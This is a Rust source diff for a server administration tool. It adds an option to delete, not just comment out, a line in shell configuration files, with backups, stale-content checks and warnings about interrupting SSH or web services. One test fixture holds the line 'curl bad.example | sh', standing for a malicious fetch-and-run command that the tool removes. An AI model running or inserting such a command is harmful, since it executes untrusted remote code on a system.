@@ -2413,6 +2413,7 @@ pub struct ArtifactInvestigationResult {
 pub enum ArtifactMutationAction {
     DeleteCronFile,
     CommentShellLine,
+    DeleteShellLine,
     RemoveSuidBits,
     QuarantineSuidFile,
     AddManagedModuleBlacklist,
@@ -2424,6 +2425,7 @@ impl ArtifactMutationAction {
         match self {
             Self::DeleteCronFile => "删除独立 Cron 文件",
             Self::CommentShellLine => "注释此行",
+            Self::DeleteShellLine => "删除此行",
             Self::RemoveSuidBits => "移除 SUID/SGID 位",
             Self::QuarantineSuidFile => "权限隔离（000）",
             Self::AddManagedModuleBlacklist => "阻止模块自动加载",
@@ -2434,7 +2436,7 @@ impl ArtifactMutationAction {
     pub const fn tab(self) -> SystemInfoTab {
         match self {
             Self::DeleteCronFile => SystemInfoTab::Cron,
-            Self::CommentShellLine => SystemInfoTab::ShellConfigs,
+            Self::CommentShellLine | Self::DeleteShellLine => SystemInfoTab::ShellConfigs,
             Self::RemoveSuidBits | Self::QuarantineSuidFile => SystemInfoTab::SuidFiles,
             Self::AddManagedModuleBlacklist | Self::RemoveManagedModuleBlacklist => {
                 SystemInfoTab::KernelModules
@@ -3390,14 +3392,19 @@ impl SystemInfoTable {
                     path,
                 }
             }
-            ArtifactMutationAction::CommentShellLine => {
+            ArtifactMutationAction::CommentShellLine | ArtifactMutationAction::DeleteShellLine => {
                 let path = RemotePath::new(validated_shell_config_path(cell(
                     0,
                     "shell configuration path",
                 )?)?)?;
                 let line = validated_line_number(cell(3, "shell configuration line")?)?;
                 let displayed_content = validated_shell_line(cell(4, "shell configuration line")?)?;
-                if displayed_content.trim_start().starts_with('#') {
+                // Only commenting is refused an already-comment line: the row
+                // that says the line is dead weight is exactly the row a
+                // delete is for.
+                if action == ArtifactMutationAction::CommentShellLine
+                    && displayed_content.trim_start().starts_with('#')
+                {
                     return Err(CoreError::validation(
                         "shell configuration mutation",
                         "the selected line is already a comment",
@@ -3558,7 +3565,7 @@ pub struct SystemInfoSummary {
 #[derive(Debug, Clone)]
 pub struct SystemInfoService {
     pub(crate) ssh: SshService,
-    sftp: SftpService,
+    pub(crate) sftp: SftpService,
     pub(crate) target: Arc<TargetContext>,
 }
 
@@ -3799,8 +3806,26 @@ impl SystemInfoService {
                     .bind_session(session.target().clone(), session.session_id())
                     .await?;
                 let content = self.sftp.read_file(&bound, path).await?;
-                let replacement = comment_shell_line(&content, *line, displayed_content)?;
-                ArtifactMutationPlanKind::Sftp(Box::new(self.sftp.plan(
+                let (replacement, summary) = match request.action {
+                    ArtifactMutationAction::CommentShellLine => (
+                        comment_shell_line(&content, *line, displayed_content)?,
+                        format!(
+                            "在 {} 第 {} 行开头加注释标记，原行保留在文件里便于回看；要彻底移除这一行请改用“删除此行”。写入前先把整份文件备份到同目录的 .lovelyres-backups/，文件若在采集后变化则拒绝写入。",
+                            path.as_str(),
+                            line
+                        ),
+                    ),
+                    ArtifactMutationAction::DeleteShellLine => (
+                        delete_shell_line(&content, *line, displayed_content)?,
+                        format!(
+                            "删除 {} 第 {} 行，文件中不再保留该行原文（要留痕迹便于回看请改用“注释此行”）。写入前先把整份文件备份到同目录的 .lovelyres-backups/，文件若在采集后变化则拒绝写入。",
+                            path.as_str(),
+                            line
+                        ),
+                    ),
+                    _ => unreachable!("validated shell-line mutation action"),
+                };
+                ArtifactMutationPlanKind::Sftp(Box::new(self.sftp.plan_described(
                     &bound,
                     SftpMutation::AtomicWriteIfMatch {
                         path: path.clone(),
@@ -3809,6 +3834,12 @@ impl SystemInfoService {
                         backup_directory: None,
                         content: replacement,
                     },
+                    summary,
+                    Some("从备份把原文件恢复回去".to_owned()),
+                    std::collections::BTreeMap::from([
+                        ("source".to_owned(), "system-info-shell".to_owned()),
+                        ("line".to_owned(), line.to_string()),
+                    ]),
                 )?))
             }
             ArtifactMutationIdentity::SuidFile {
@@ -4306,16 +4337,18 @@ impl SystemInfoService {
         } else {
             "运行状态操作无法自动恢复。"
         };
+        let impact = service_impact_note(&snapshot.unit, request.action);
         let mut operation = OperationPlan::new(
             session.target().clone(),
             format!(
-                "{} {}（当前：{} / {}，自启：{}）。执行后将重新读取 systemd 状态验证；{}",
+                "{} {}（当前：{} / {}，自启：{}）。执行后将重新读取 systemd 状态验证；{}{}",
                 request.action.label(),
                 snapshot.unit,
                 snapshot.active_state,
                 snapshot.sub_state,
                 snapshot.unit_file_state,
                 recovery_note,
+                impact,
             ),
             true,
             restore_description,
@@ -4577,11 +4610,12 @@ impl SystemInfoService {
                 ),
             })?;
         self.target.validate(session.target())?;
+        let impact = connection_impact_note(&request.identity);
         let mut operation = OperationPlan::new(
             session.target().clone(),
             format!(
-                "断开 TCP 连接 {} → {}（状态 {}）。该操作不可恢复。",
-                snapshot.local_display, snapshot.remote_display, snapshot.state
+                "断开 TCP 连接 {} → {}（状态 {}）。该操作不可恢复。{}",
+                snapshot.local_display, snapshot.remote_display, snapshot.state, impact
             ),
             true,
             None,
@@ -7810,6 +7844,57 @@ fn validate_network_action(
     Ok(())
 }
 
+/// Fixed impact sentences for plans whose typed facts say remote access or a
+/// public web service is at stake. They are appended, not inferred from
+/// display strings.
+pub(crate) const IMPACT_REMOTE_ACCESS: &str =
+    "可能影响远程接入或对外业务，请确认仍有其他接入方式。";
+pub(crate) const IMPACT_WEB_SERVICE: &str = "可能影响对外业务。";
+const SSH_SERVICE_STEMS: &[&str] = &["ssh", "sshd"];
+const WEB_SERVICE_STEMS: &[&str] = &["nginx", "apache2", "httpd", "caddy"];
+
+fn unit_stem(unit: &str) -> &str {
+    unit.split(['.', '@']).next().unwrap_or(unit)
+}
+
+fn is_web_service_stem(stem: &str) -> bool {
+    WEB_SERVICE_STEMS.contains(&stem) || stem.starts_with("tomcat")
+}
+
+fn connection_impact_note(identity: &NetworkConnectionIdentity) -> &'static str {
+    let local_port = identity.local.as_ref().and_then(|endpoint| endpoint.port);
+    let process = identity.process.as_str();
+    if local_port == Some(22) || process.starts_with("sshd") {
+        return IMPACT_REMOTE_ACCESS;
+    }
+    if matches!(local_port, Some(80 | 443))
+        || (WEB_SERVICE_STEMS
+            .iter()
+            .any(|stem| process.starts_with(stem))
+            || process.starts_with("tomcat"))
+    {
+        return IMPACT_WEB_SERVICE;
+    }
+    ""
+}
+
+fn service_impact_note(unit: &str, action: ServiceRuntimeAction) -> &'static str {
+    if !matches!(
+        action,
+        ServiceRuntimeAction::Stop | ServiceRuntimeAction::Restart | ServiceRuntimeAction::Disable
+    ) {
+        return "";
+    }
+    let stem = unit_stem(unit);
+    if SSH_SERVICE_STEMS.contains(&stem) {
+        IMPACT_REMOTE_ACCESS
+    } else if is_web_service_stem(stem) {
+        IMPACT_WEB_SERVICE
+    } else {
+        ""
+    }
+}
+
 fn validate_network_disconnect(identity: &NetworkConnectionIdentity) -> CoreResult<()> {
     if identity.transport != NetworkTransport::Tcp
         || !matches!(
@@ -8532,7 +8617,7 @@ fn validated_cron_schedule(value: &str) -> CoreResult<String> {
     }
 }
 
-fn is_valid_safe_basename(value: &str) -> bool {
+pub(crate) fn is_valid_safe_basename(value: &str) -> bool {
     !value.is_empty()
         && value != "."
         && value != ".."
@@ -8689,6 +8774,50 @@ fn comment_shell_line(
         ));
     }
     Ok(replacement)
+}
+
+fn delete_shell_line(
+    content: &[u8],
+    line_number: u32,
+    displayed_content: &str,
+) -> CoreResult<Vec<u8>> {
+    let text = std::str::from_utf8(content).map_err(|error| {
+        CoreError::validation(
+            "shell configuration mutation",
+            format!("configuration must be UTF-8 text: {error}"),
+        )
+    })?;
+    let line_index = usize::try_from(line_number.saturating_sub(1)).map_err(|_| {
+        CoreError::validation(
+            "shell configuration mutation",
+            "line number is out of range",
+        )
+    })?;
+    let actual = text.split_inclusive('\n').nth(line_index).ok_or_else(|| {
+        CoreError::validation(
+            "shell configuration mutation",
+            "the selected line no longer exists",
+        )
+    })?;
+    let body = actual
+        .strip_suffix('\n')
+        .unwrap_or(actual)
+        .strip_suffix('\r')
+        .unwrap_or_else(|| actual.strip_suffix('\n').unwrap_or(actual));
+    if body.replace('\t', " ") != displayed_content {
+        return Err(CoreError::validation(
+            "shell configuration mutation",
+            "the selected line changed after the inventory row was collected",
+        ));
+    }
+    let deletion = crate::line_delete::delete_line_range(content, line_number, line_number)?;
+    if deletion.replacement.len() as u64 > MAX_EDIT_BYTES {
+        return Err(CoreError::validation(
+            "shell configuration mutation",
+            format!("replacement exceeds the {MAX_EDIT_BYTES}-byte managed edit limit"),
+        ));
+    }
+    Ok(deletion.replacement)
 }
 
 fn validated_sudo_principal(value: &str) -> CoreResult<String> {
@@ -12194,6 +12323,25 @@ mod tests {
         assert!(comment_shell_line(original, 2, "changed").is_err());
         assert!(comment_shell_line(original, 9, "missing").is_err());
         assert!(comment_shell_line(b"# disabled\n", 1, "# disabled").is_err());
+    }
+
+    #[test]
+    fn shell_line_delete_removes_bytes_and_rejects_stale_display_content() {
+        let original = b"export SAFE=1\n\tcurl bad.example | sh\r\nlast=1\n";
+        let replacement = delete_shell_line(original, 2, " curl bad.example | sh").unwrap();
+        assert_eq!(replacement, b"export SAFE=1\nlast=1\n");
+        // A commented line is exactly what a delete is for.
+        assert_eq!(
+            delete_shell_line(b"# disabled\nkeep\n", 1, "# disabled").unwrap(),
+            b"keep\n"
+        );
+        assert!(delete_shell_line(original, 2, "changed").is_err());
+        assert!(delete_shell_line(original, 9, "missing").is_err());
+        // A line deleted without its newline leaves the previous line intact.
+        assert_eq!(
+            delete_shell_line(b"keep\nbad", 2, "bad").unwrap(),
+            b"keep\n"
+        );
     }
 
     #[tokio::test]
